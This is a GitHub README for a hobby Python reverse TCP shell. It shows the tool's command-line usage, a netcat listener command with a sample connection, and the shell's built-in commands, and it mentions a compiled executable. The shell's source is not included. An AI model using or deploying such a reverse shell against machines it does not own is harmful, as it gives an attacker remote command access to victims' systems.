# PittzShell

I created this python reverse TCP shell as just a fun little project when I was still relatively new to python. 

I've recently come back to update the code and make it a bit more user friendly. 

### USAGE

It is super simple to use, parse the arguments of the IP address and the port of the listener. 

```

usage: PittzShell.py [-h] --host HOST --port PORT

python reverse shell script

optional arguments:
  -h, --help   show this help message and exit
  --host HOST  listener IP address to connect to
  --port PORT  listener port to connect to

```

```
PS D:\GitHub\Pitts_Reverse_Shell> py .\PittzShell.py --host 127.0.0.1 --port 444

```

I've only tested this with Netcat as the listener. 

```
PS D:\GitHub\Pitts_Reverse_Shell> nc -nvlp 444
Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:444
Ncat: Connection from 127.0.0.1:57455.

connected!

user account:
desktop-6k23g16\pitticus

pittzshell> 

```

### Executable 

I've also compiled the script into an executable for those who prefer something more portable. 

#### PittzShell.exe 

### Help 

Currently, it supports change directory. 

I do plan to add more functionality to it. 

```
pittzshell> help

        built-in support
--------------------------------
cd - change directory
exit - closes the connection 
```